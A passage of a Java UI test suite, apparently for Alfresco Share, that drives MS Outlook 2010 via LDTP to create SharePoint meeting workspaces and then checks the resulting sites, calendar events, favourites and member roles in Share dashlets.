        Ldtp l = outlook.openOfficeApplication();

        // create new meeting workspace
        outlook.operateOnCreateNewMeetingWorkspace(l, sharePointPath, siteName, location, testUser, DEFAULT_PASSWORD, true, false);

        Runtime.getRuntime().exec("taskkill /F /IM OUTLOOK.EXE");

        Ldtp l1 = outlook.openOfficeApplication();

        // create new meeting workspace
        outlook.operateOnCreateNewMeetingWorkspace(l1, sharePointPath, siteName2, location, testUser, DEFAULT_PASSWORD, true, false);
    }

    @Test(groups = "alfresco-one")
    public void AONE_9726() throws Exception
    {
        String testName = getTestName() + next_site;
        String siteName = getSiteName(testName) + "1";
        String siteName2 = getSiteName(testName) + "2";
        String testUser = getUserNameFreeDomain(testName);
        DocumentLibraryPage documentLibPage;

        // User login.
        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);
        dashlet = new MyMeetingWorkSpaceDashlet(drone);

        List<ShareLink> sites = dashlet.getSites();

        // Both created workspaces are present at the list of My Meeting Workspaces.
        String foundSites = sites.toString();
        Assert.assertNotNull(sites);
        Assert.assertTrue(foundSites.contains(siteName));
        Assert.assertTrue(foundSites.contains(siteName2));
        dashlet.selectFavoriteSite(siteName);
        Assert.assertTrue(dashlet.isSiteFavourite(siteName));
        Assert.assertFalse(dashlet.isSiteFavourite(siteName2));

        ShareLink link = dashlet.selectSite(siteName2);
        SitePage sitePage = link.click().render();
        Assert.assertNotNull(sitePage);

        // navigate to calendar page
        CalendarPage calendarPage = sitePage.getSiteNav().selectCalendarPage();
        boolean isCalendarPage = calendarPage.isSitePage("Calendar");
        Assert.assertTrue(isCalendarPage);

        // navigate to site
        documentLibPage = sitePage.getSiteNav().selectSiteDocumentLibrary();
        boolean isDocLib = documentLibPage.isSitePage("Document Library");
        Assert.assertTrue(isDocLib);

        // navigate to Site Members Page
        sitePage.getSiteNav().selectMembersPage();
        Assert.assertTrue(drone.getTitle().contains("Site Members"));

    }

    @Test(groups = { "DataPrepMSOutlook" })
    public void dataPrep_9727() throws Exception
    {
        String testName = getTestName() + next_site;
        String siteName = getSiteName(testName);
        String testUser = getUserNameFreeDomain(testName);
        String location = testName + " - Room";

        // Create User
        String[] testUserInfo = new String[] { testUser };
        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, testUserInfo);

        // User login.
        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);

        // MS Outlook 2010 is opened;
        Ldtp l = outlook.openOfficeApplication();

        // create new meeting workspace
        outlook.operateOnCreateNewMeetingWorkspace(l, sharePointPath, siteName, location, testUser, DEFAULT_PASSWORD, true, false);

    }

    @Test(groups = "alfresco-one")
    public void AONE_9727() throws Exception
    {
        String testName = getTestName() + next_site;
        String siteName = getSiteName(testName);
        String testUser = getUserNameFreeDomain(testName);

        // User login.
        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);

        // navigate to site
        SiteDashboardPage siteDashBoard = SiteUtil.openSiteFromSearch(drone, siteName);

        // navigate to Calendar
        CalendarPage calendarPage = siteDashBoard.getSiteNav().selectCalendarPage();
        Assert.assertTrue(calendarPage.isEventPresent(CalendarPage.EventType.MONTH_TAB_ALL_DAY_EVENT, siteName));

        // verify event information
        InformationEventForm eventInfo = calendarPage.clickOnEvent(CalendarPage.EventType.MONTH_TAB_ALL_DAY_EVENT, siteName).render();
        Assert.assertEquals(eventInfo.getWhatDetail(), siteName);
        calendarPage = eventInfo.closeInformationForm().render();

        siteDashBoard = SiteUtil.openSiteFromSearch(drone, siteName);

        // Add Site Calendar dashlet
        ShareUserDashboard.addDashlet(drone, siteName, Dashlets.SITE_CALENDAR);

        siteDashBoard = SiteUtil.openSiteFromSearch(drone, siteName).render();
        SiteCalendarDashlet siteCalendarDashlet = siteDashBoard.getDashlet("site-calendar").render();

        String weekDay;
        SimpleDateFormat dayFormat = new SimpleDateFormat("EEEE, d MMMM, yyyy", Locale.US);

        Calendar calendar = Calendar.getInstance();
        weekDay = dayFormat.format(calendar.getTime());

        // The created appointment is displayed with correct date on the dashlet;
        Assert.assertTrue(siteCalendarDashlet.isEventsDisplayed(siteName), "The " + siteName + " isn't correctly displayed on calendar");
        Assert.assertTrue(siteCalendarDashlet.isEventsWithHeaderDisplayed(weekDay));

    }

    @Test(groups = { "DataPrepMSOutlook" })
    public void dataPrep_9728() throws Exception
    {
        String testName = getTestName() + next_site;
        String siteName = getSiteName(testName);
        String location = testName + " - Room";

        String testUser = getUserNameFreeDomain(testName);

        // Create User
        String[] testUserInfo = new String[] { testUser };
        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, testUserInfo);

        // User login.
        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);

        // add My Meeting workspaces dashlet
        SharePage page = drone.getCurrentPage().render();
        dashBoard = page.getNav().selectMyDashBoard();

        customizeUserDash = dashBoard.getNav().selectCustomizeUserDashboard();
        customizeUserDash.render();

        dashBoard = customizeUserDash.addDashlet(Dashlets.MY_CALENDAR, 1).render();

        // MS Outlook 2010 is opened;
        Ldtp l = outlook.openOfficeApplication();

        // create new meeting workspace
        outlook.operateOnCreateNewMeetingWorkspace(l, sharePointPath, siteName, location, testUser, DEFAULT_PASSWORD, true, false);

    }

    @Test(groups = "alfresco-one")
    public void AONE_9728() throws Exception
    {
        String testName = getTestName() + next_site;
        String siteName = getSiteName(testName);
        String testUser = getUserNameFreeDomain(testName);

        // User login.
        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);
        DashBoardPage userDashboard = ShareUser.selectMyDashBoard(drone);
        MyCalendarDashlet myCalendar = userDashboard.getDashlet("my-calendar").render();

        // verify the new event is displayed
        Assert.assertTrue(myCalendar.isEventsDisplayed(siteName), "The " + siteName + " isn't correctly displayed on my calendar");

        // User goes to the Calendar tab of the meeting workspace; the event is dispalyed in calendar;
        CalendarPage calendarPage = myCalendar.clickEvent(siteName);
        boolean isCalendarPage = calendarPage.isSitePage("Calendar");
        Assert.assertTrue(isCalendarPage);
        Assert.assertTrue(calendarPage.isEventPresent(CalendarPage.EventType.MONTH_TAB_ALL_DAY_EVENT, siteName));

        // Go to My dashboard and click meeting workspace's name;
        userDashboard = ShareUser.selectMyDashBoard(drone);
        myCalendar = userDashboard.getDashlet("my-calendar").render();

        myCalendar.clickSite(siteName).render();

        // User goes to the Site dasboards of the meeting place;
        Assert.assertTrue(drone.getTitle().contains("Meeting Workspace Dashboard"));

    }

    @SuppressWarnings("unused")
    @Test(groups = { "DataPrepMSOutlook" })
    public void dataPrep_9729() throws Exception
    {
        String testName = getTestName() + next_site;
        String siteName_meeting = getSiteName(testName);
        String siteName_document = getSiteName(testName);
        String location = testName + " - Room";
        DashBoardPage dashBoard;

        String testUser = getUserNameFreeDomain(testName);

        // User Create
        String[] testUserInfo = new String[] { testUser };
        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, testUserInfo);

        // User login.
        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);

        // create Document Workspace
        ShareUser.createSite(drone, siteName_document, SITE_VISIBILITY_PUBLIC);

        // MS Outlook 2010 is opened;
        Ldtp l = outlook.openOfficeApplication();

        // create new meeting workspace
        outlook.operateOnCreateNewMeetingWorkspace(l, sharePointPath, siteName_meeting, location, testUser, DEFAULT_PASSWORD, true, false);

        // Several sites are marked as favorite (including workspaces).
        SharePage page = getSharePage(drone);
        page.getNav().selectMyDashBoard().render();

        MySitesDashlet mySites = ShareUser.getDashlet(drone, "my-sites").render();
        dashBoard = mySites.selectMyFavourites(FavouriteType.ALL).render();
        mySites.selectFavorite(siteName_meeting);
        ShareLink link = mySites.selectSite(siteName_meeting);
        SitePage sitePage = link.click().render();
    }

    @Test(groups = "alfresco-one")
    public void AONE_9729() throws Exception
    {
        String testName = getTestName() + next_site;
        String siteName_workspace = getSiteName(testName);
        String siteName_document = getSiteName(testName);
        String testUser = getUserNameFreeDomain(testName);
        @SuppressWarnings("unused")
        DashBoardPage dashBoard;

        // User login.
        ShareUser.login(drone, testUser, DEFAULT_PASSWORD);

        MySitesDashlet mySites = ShareUser.getDashlet(drone, "my-sites").render();

        // Choose All filter (default) and verify the list of the sites.
        dashBoard = mySites.selectMyFavourites(FavouriteType.ALL).render();

        List<ShareLink> sites = mySites.getSites();

        // Both Meeting and Document workspaces are present in the list.
        String foundSites = sites.toString();
        Assert.assertNotNull(sites);
        Assert.assertTrue(foundSites.contains(siteName_workspace));
        Assert.assertTrue(foundSites.contains(siteName_document));

        // Choose Recent filter and verify the list of the sites.
        dashBoard = mySites.selectMyFavourites(FavouriteType.Recent).render();
        sites = mySites.getSites();

        // Meeting and Document workspaces are present in the list.
        foundSites = sites.toString();
        Assert.assertNotNull(sites);
        Assert.assertTrue(foundSites.contains(siteName_workspace));
        Assert.assertTrue(foundSites.contains(siteName_document));

        // Choose My Favorites filter and verify the list of the sites.
        mySites = ShareUser.getDashlet(drone, "my-sites").render();
        dashBoard = mySites.selectMyFavourites(FavouriteType.MyFavorites).render();
        sites = mySites.getSites();

        // Both Meeting and Document workspaces are present in the list.
        foundSites = sites.toString();
        Assert.assertNotNull(sites);
        Assert.assertTrue(foundSites.contains(siteName_workspace));
        Assert.assertTrue(foundSites.contains(siteName_document));

    }

    @Test(groups = { "DataPrepMSOutlook" })
    public void dataPrep_9730() throws Exception
    {
        String testName = getTestName() + next_site;
        String toUser = getUserNameFreeDomain(testName);

        // Create User
        String[] testUserInfo = new String[] { toUser };
        CreateUserAPI.CreateActivateUser(drone, ADMIN_USERNAME, testUserInfo);

    }

    @Test(groups = "alfresco-one")
    public void AONE_9730() throws Exception
    {
        String testName = getTestName() + next_site;
        String location = testName + " - Room";
        String siteName_meeting = getSiteName(testName) + "_meeting";
        String toUser = getUserNameFreeDomain(testName);

        Ldtp security = new Ldtp("Windows Security");

        // MS Outlook 2010 is opened;
        Ldtp l = outlook.openOfficeApplication();

        outlook.getAbstractUtil().clickOnObject(l, "btnMeeting");

        Ldtp l2 = outlook.getAbstractUtil().setOnWindow("Untitled");

        outlook.getAbstractUtil().clickOnObject(l2, "btnMeetingWorkspace");
        outlook.getAbstractUtil().clickOnObject(l2, "hlnkChangesettings");

        l2.selectItem("cboWebsiteDropdown", "Other...");

        Ldtp l3 = outlook.getAbstractUtil().setOnWindow("Other Workspace Server");

        l3.deleteText("txtServerTextbox", 0);
        l3.enterString("txtServerTextbox", sharePointPath);
        l3.click("btnOK");

        outlook.operateOnSecurity(security, testUser, DEFAULT_PASSWORD);

        l2.click("chkAlldayevent");

        Ldtp l4 = outlook.getAbstractUtil().setOnWindow("Untitled");
        l4.click("btnOK");
        l4.enterString("txtTo", toUser);
        l4.enterString("txtLocation", location);
        l4.enterString("txtSubject", siteName_meeting);

        // Click "create" button;
        l4.click("btnCreate");
        outlook.operateOnSecurity(security, testUser, DEFAULT_PASSWORD);
        outlook.operateOnSecurity(security, testUser, DEFAULT_PASSWORD);

        Ldtp subject_window = outlook.getAbstractUtil().setOnWindow(siteName_meeting);
        subject_window.waitTillGuiExist("btnSend");

        // Click "Send" button
        subject_window.click("btnSend");

        ShareUser.login(drone, toUser, DEFAULT_PASSWORD);

        // navigate to site
        SiteDashboardPage siteDashBoard = SiteUtil.openSiteFromSearch(drone, siteName_meeting);

        // navigate to Calendar
        CalendarPage calendarPage = siteDashBoard.getSiteNav().selectCalendarPage();
        Assert.assertTrue(calendarPage.isEventPresent(CalendarPage.EventType.MONTH_TAB_ALL_DAY_EVENT, siteName_meeting));

        // This user is added to "sub" workspace as site collaborator
        SiteUtil.openSiteFromSearch(drone, siteName_meeting).render();
        SiteMembersPage siteMembersPage = siteDashBoard.getSiteNav().selectMembers();
        assertTrue(siteMembersPage.isUserHasRole(toUser, UserRole.COLLABORATOR), String.format("Wrong role fore user[%s]", toUser));

    }

}
